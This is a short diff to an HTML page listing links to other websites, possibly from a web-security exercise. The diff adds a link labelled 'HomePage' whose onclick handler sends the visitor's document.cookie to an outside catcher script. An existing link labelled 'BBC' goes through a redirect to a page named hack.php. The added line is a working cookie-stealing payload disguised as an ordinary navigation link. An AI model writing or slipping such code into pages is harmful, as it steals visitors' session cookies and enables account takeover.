@@ -43,6 +43,9 @@ Enter any website you want to visit: <input type="text" name="someUserInput"><br
 <h3>Link to other websites</h3>
    <ul>
   
+ <li><a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">HomePage </a> </li>
+
+
 
  <li><a href="http://www.nytimes.com/" target="_blank" >NYTimes </a></li>
   <li><a href="http://theplanetreports.com/redirect.php?url=http://theplanetreports.com/hack.php" target="_blank" >BBC </a></li>
